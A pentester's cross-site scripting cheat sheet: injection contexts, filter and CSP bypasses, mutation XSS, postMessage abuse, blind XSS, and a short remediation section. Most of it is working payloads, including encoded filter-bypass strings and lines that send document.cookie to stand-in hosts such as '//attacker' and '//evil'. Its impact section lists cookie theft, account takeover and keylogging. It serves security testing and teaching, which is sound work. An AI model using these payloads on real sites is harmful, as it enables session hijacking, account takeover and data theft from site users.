# XSS

## Context-first

Always identify the injection context before trying payloads.

| Context | Example | Starter payload |
|---------|---------|-----------------|
| HTML body | `<div>INJ</div>` | `<script>alert(1)</script>`, `<svg onload=...>` |
| HTML attribute (quoted) | `<input value="INJ">` | `" onfocus=alert(1) autofocus x="` |
| HTML attribute (unquoted) | `<input value=INJ>` | ` onfocus=alert(1) autofocus` |
| JS string | `var x = "INJ"` | `";alert(1);//` |
| JS template literal | `` `INJ` `` | `${alert(1)}` |
| CSS | `style="color:INJ"` | `red;background:url(javascript:...)` |
| URL attribute | `<a href="INJ">` | `javascript:alert(1)` |
| JSON embedded in script | `<script>var j={...INJ}</script>` | `</script><script>alert(1)</script>` |

## Reflected — classic

```bash
# Feed URLs + payloads to dalfox
dalfox url "https://target.com/search?q=FUZZ" --deep-domain-xss

# Or kxss + qsreplace for pre-filter
cat urls.txt | qsreplace '"><script>alert(1)</script>' | kxss
```

## DOM XSS

Sinks in JS (client-side):
- `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML`.
- `eval`, `setTimeout(str)`, `setInterval(str)`, `Function(str)`.
- `location`, `location.href`, `location.hash` → if re-written.
- `postMessage` handlers without origin check.
- `jQuery.html()`, `$.parseHTML()`.

Sources: `location.search`, `location.hash`, `document.referrer`, `window.name`, postMessage.

Tooling: DOM Invader (Burp), Chrome DevTools breakpoints on DOM modifications.

## mXSS (mutation)

Browser parser rewrites HTML after sanitizer runs. Sanitizers like DOMPurify have had mXSS bugs where templating re-introduces script.

Classic payload:
```
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
```

Always test the latest DOMPurify version — older versions have many mXSS bypasses.

## CSP bypasses

Read CSP header. Common weaknesses:

- `'unsafe-inline'` + `'unsafe-eval'` → no protection.
- `script-src 'self'` + JSONP endpoint on same host → `?callback=alert(1)`.
- Allowed CDN with user-uploadable JS (old Google sites, storage.googleapis.com).
- `'strict-dynamic'` + a reflected/dangling script injection → full bypass.
- Data exfil via `img-src *` + `<img src=//evil/?=document.cookie>`.
- Missing `base-uri` → `<base href="//evil">` hijacks relative scripts.

Check [CSP Evaluator](https://csp-evaluator.withgoogle.com/).

## postMessage

```js
window.addEventListener('message', e => {
  document.getElementById('out').innerHTML = e.data;   // no origin check
});
```

Exploit: open target in iframe, `frame.postMessage('<img src=x onerror=alert(1)>','*')`.

Always test cross-origin postMessage handlers.

## Filter / blocklist bypasses

```
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<a href="javascript:alert(1)">x</a>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```

Encoding tricks:
```
<svg/onload=&#x61;lert(1)>
<svg/onload=alert&NewLine;(1)>
<svg onload="alert&lpar;1&rpar;">
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
```

Event handler fuzzing: [PortSwigger XSS cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).

## Blind XSS

Store payload; fires in admin/back-office contexts.

```html
<script src="//xss.report/c/<id>"></script>
<img src=x onerror="fetch('//attacker/?c='+document.cookie)">
```

Use XSS Hunter (self-hosted: xsshunter-express) or [h3x0r xsshunter](https://github.com/mandatoryprogrammer/xsshunter-express). Place in:
- User profile fields, addresses, company names.
- Invoice notes, support ticket subjects.
- Referrer headers (logged in admin dashboards).
- HTTP headers reflected in admin logs.

## Impact beyond alert(1)

Don't stop at alert — demonstrate real impact:
- Cookie theft (if not `HttpOnly`).
- Session rebinding / account takeover via CSRF token theft.
- Keylogging on sensitive pages (payment, settings).
- Internal SSRF via XHR to admin APIs.

Use an exfil endpoint you control for PoC; don't mass-collect real user data.

## Remediation

- Output-encode per context (HTML, attr, JS, URL, CSS).
- Template engines with auto-escape (Django, Jinja2 `autoescape=True`, React JSX).
- CSP with `'strict-dynamic'` + nonces, no `unsafe-inline`.
- `HttpOnly`, `SameSite=Lax|Strict` cookies.
- `Trusted Types` policy (Chrome-based browsers).

## References

- PortSwigger — https://portswigger.net/web-security/cross-site-scripting
- OWASP XSS Cheatsheet — https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- DOMPurify — https://github.com/cure53/DOMPurify
- PayloadsAllTheThings XSS
